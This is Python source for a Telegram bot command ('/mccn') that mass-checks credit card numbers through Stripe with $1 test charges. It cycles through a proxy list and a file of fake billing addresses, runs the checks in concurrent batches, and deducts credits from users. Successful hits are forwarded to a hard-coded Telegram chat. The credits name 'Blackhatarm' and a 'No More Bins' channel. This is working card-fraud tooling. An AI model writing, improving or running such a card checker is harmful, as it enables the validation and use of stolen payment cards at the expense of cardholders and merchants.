from pyrogram import Client, filters
import time, threading
import asyncio, httpx
from datetime import timedelta
from FUNC.usersdb_func import *
from FUNC.defs import *
from .func import *
from TOOLS.check_all_func import *
from TOOLS.getcc_for_mass import *


@Client.on_message(filters.command("mccn", [".", "/"]))
def multi(Client, message):
    t1 = threading.Thread(target=bcall, args=(Client, message))
    t1.start()


def bcall(Client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(stripe_mass_auth_cmd(Client, message))
    loop.close()


async def stripe_mass_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client , message)

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getcc_for_mass(message, role)

        if getcc[0] == False:
            await message.reply_text(getcc[1], message.id)
            return

        ccs = getcc[1]
        resp = f"""<b>
Gate : Mass Stripe Ccn Charge 1$ 💋️

CC Amount : {len(ccs)}
Message : Checking CC For {first_name}

Status : Processing...⌛️

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> [ {role} ] 
Bot by - <a href="https://t.me/callmeslayer69">Blackhatarm</a> X <a href="tg://user?id=5371579102">⏤͟͞🇧🇩⌁𝙒𝙞𝙣𝙩𝙚𝙧𝙜𝙧𝙚𝙚𝙣 𝙈𝙖𝙧𝙨ヤ
        </b> """
        nov = await message.reply_text(resp, message.id)

        text = f"""
<b>↯ MASS CHARGE</b> \n
"""
        amt, start = 0 , time.perf_counter()
        proxy = open("FILES/proxy.txt", "r", encoding="utf-8").read().splitlines()
        data = json.loads(open("FILES/address.json", "r" , encoding="utf-8").read())
        works = [mass_charge_func(i , proxy , data , user_id) for i in ccs]
        worker_num = int(json.loads(open("FILES/config.json", "r").read())["THREADS"])

        while works:
            a = works[:worker_num]
            a = await asyncio.gather(*a)
            for i in a:
                amt += 1
                text += i
                if amt % 5 == 0:
                    await asyncio.sleep(0.5)
                    try:
                        await Client.edit_message_text(message.chat.id, nov.id, text)
                    except:
                        pass

            works = works[worker_num:]

        td = str(timedelta(seconds=time.perf_counter() - start)).split(":")
        hour, min, sec = td[0], td[1], td[2].split(".")[0]

        text += f"""



Total CC Checked - {len(ccs)}
Credit Deducted - {len(ccs)}
Time Taken - {hour} Hours {min} Min {sec} Seconds
Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 💋️ [ {role}]
Updates  - <a href="https://t.me/NoMoreBins">三 𝙉𝙤 𝙈𝙤𝙧𝙚 𝘽𝙞𝙣𝙨 三</a>
Owner - <a href="https://t.me/stripe_xD">>⏤͟͞🇧🇩⌁𝙒𝙞𝙣𝙩𝙚𝙧𝙜𝙧𝙚𝙚𝙣 𝙈𝙖𝙧𝙨ヤ</a>

"""
        await Client.edit_message_text(message.chat.id, nov.id, text)
        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)
        if any("Payment Successful Charged 1$ Ccn Charge (Site Based)🔥" in i for i in text.split('\n')):
            # Replace -1002117945382 with the actual chat ID
            target_chat_id = -1002140459626
            await Client.send_message(target_chat_id, text=text)
    except:
        import traceback
        await error_log(traceback.format_exc())
